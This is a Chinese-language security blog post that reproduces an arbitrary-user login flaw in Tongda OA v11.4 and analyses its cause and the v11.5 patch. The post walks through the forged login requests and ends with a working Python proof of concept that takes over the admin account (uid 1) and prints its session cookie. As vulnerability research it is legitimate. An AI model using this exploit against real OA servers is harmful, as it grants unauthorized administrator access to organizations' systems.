<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处） - 打渔为生</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=>
  
    <meta name="description" content="全平台漏洞挖掘手记">
  
  
  
    <link rel="alternate" href="/atom.xml " title="打渔为生" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.3.0"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">打渔为生</a>
    <div class="subtitle">tutucoo的技术笔记</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">主页</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">关于</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%EF%BC%9APOC"><span class="toc-text">附：POC</span></a></li></ol>

  <div class="post-content">
    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的 Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。</p>
<p>通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>官网：<a target="_blank" rel="noopener" href="https://www.tongda2000.com/">https://www.tongda2000.com/</a></p>
<p>下载：<a target="_blank" rel="noopener" href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</a></p>
<p>版本：通达OA V11.X&lt;V11.5</p>
<p>测试系统： </p>
<p>Windows 7 专业版 64位操作系统 </p>
<p>macOS11.0.1 （攻击机）</p>
<p>python3.7.5</p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>第一步：访问ispirit/login_code.php，在返回值中保存codeuid：{58AA7BF5-725C-F8EB-3324-BE17C4E8F6AA}</p>
<p>第二步：访问general/login_code_scan.php<br>修改如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET请求改为POST请求</span><br><span class="line">添加Content-Type</span><br><span class="line">添加Content-Length</span><br><span class="line">添加请求体codeuid&#x3D;&#123;xxx&#125;&amp;source&#x3D;pc&amp;uid&#x3D;1&amp;type&#x3D;confirm&amp;username&#x3D;admin</span><br></pre></td></tr></table></figure>


<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219101708128_5207.png"></p>
<p>这个请求一般会返回status 1</p>
<p>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102012280_28610.png"></p>
<p>  第三步：访问/ispirit/login_code_check.php?codeuid={xxx}</p>
<p>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102123533_12814.png"></p>
<p>  如果请求正常，会返回如下图所示数据<br>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102401024_13617.png"></p>
<p>第四步：访问/general/index.php，顺利登录后台，权限是系统管理员，实现任意用户登录<br>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102509925_13991.png"></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞地址存在于general/login_code_scan.php，进入解密后的源码处查看代码，可以看到通过POST请求接收5个参数，然后存到数组里，uid可控，没有对uid进行任何校验，这就产生了漏洞<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219104350520_5847.png"></p>
<p>这里会检测codeuid，如果codeuid存在并且正确会返回1</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219104600278_30979.png"></p>
<p>再后面就没有任何检测了，直接在返回包里返回status</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219105133157_30970.png"></p>
<p>漏洞点要发送5个参数，分别是codeuid，source，uid，type，username</p>
<ul>
<li><p>codeuid必须是实时获取到的，否则无法通过校验</p>
</li>
<li><p>source只需填入pc、web或者mac其中之一（源码中做了判断,必须是这三个之一才会正常返回status）</p>
</li>
<li><p>uid为1就是管理员权限，可以通过本地数据库查到，前面几篇博客都说明了，就不多说了。</p>
</li>
<li><p>最后并没有对type和username做检测</p>
</li>
</ul>
<p>按理发请求的时候这两个任意值都是可以的，但是经过测试username可以是任意值，但是type必须是confirm，否则无法任意用户登录，那么这个type应该是有校验的，只不过不是在这个文件中，所以我们要找到这个校验处。<br>  校验很可能存在的位置就是下一个步骤，也就是访问/ispirit/login_code_check.php?codeuid={xxx}，找到源码进行查看。<br>可以看到15行对type进行判断</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219170612652_23176.png"></p>
<p>如果type不是confirm就不会执行session操作，换句话就无法保存状态，伪造的管理员cookie也就无法生效了，后续直接访问后台就不会成功，所以type必须是confirm。</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219170917295_8923.png"></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>找到v11.5版本的general/login_code_scan.php文件，可以看到不再直接从UID参数中取UID了，而是通过P参数获取sessionid，再通过sessionid获取数据库中的UID，再通过UID等信息生成TOKEN，最后再通过TOKEN等信息生成缓存，这样就解决了UID可控的问题了</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219215830050.png" alt="image-20201219215830050"></p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219221115596.png" alt="image-20201219221115596"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞点存在于general/login_code_scan.php，需要传递5个参数，分别是codeuid、source、uid、type、username、其中codeuid需要发送ispirit/login_code.php请求获取，其他几个参数通过分析源码我们也都知道了，唯独还有/ispirit/login_code_check.php?codeuid={xxx}请求，不知道是从何而来，可能是通过黑盒测试，二维码扫描过程中抓到的吧，也就是个猜测，自己通过APP扫码登录出了点问题，就不再细说了。</p>
<h2 id="附：POC"><a href="#附：POC" class="headerlink" title="附：POC"></a>附：POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def getSession(url):</span><br><span class="line">    vulUrl &#x3D; url+&#39;&#x2F;ispirit&#x2F;login_code.php&#39;</span><br><span class="line">    res &#x3D; requests.get(vulUrl)</span><br><span class="line">    codeuid &#x3D; json.loads(res.text)[&#39;codeuid&#39;]</span><br><span class="line">    print(codeuid)</span><br><span class="line">    confirmUrl &#x3D; url + &#39;&#x2F;general&#x2F;login_code_scan.php&#39;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;codeuid&#39;:codeuid,</span><br><span class="line">        &#39;uid&#39;: int(1),</span><br><span class="line">        &#39;source&#39;: &#39;pc&#39;,</span><br><span class="line">        &#39;type&#39;: &#39;confirm&#39;,</span><br><span class="line">        &#39;username&#39;: &#39;admin&#39;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res &#x3D; requests.post(confirmUrl,data&#x3D;data)</span><br><span class="line">    status &#x3D; json.loads(res.text)[&#39;status&#39;]</span><br><span class="line">    print(status)</span><br><span class="line">    if status &#x3D;&#x3D; str(1):</span><br><span class="line">        seesionUrl &#x3D; url + &#39;&#x2F;ispirit&#x2F;login_code_check.php?codeuid&#x3D;&#39;+codeuid</span><br><span class="line">        res &#x3D; requests.get(seesionUrl)</span><br><span class="line">        print(&#39;[*]cookie:&#39;+res.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[-]failed&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    getSession(&#39;http:&#x2F;&#x2F;xxxx&#x2F;&#39;)</span><br></pre></td></tr></table></figure>
  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-12-19</span>
  </div>

  <div class="post-footer">
    

    <a href="#top" class="top">返回顶部</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2021
  <span class="author">
    tutucoo
  </span>
</footer>


    </div>
  </body>
</html>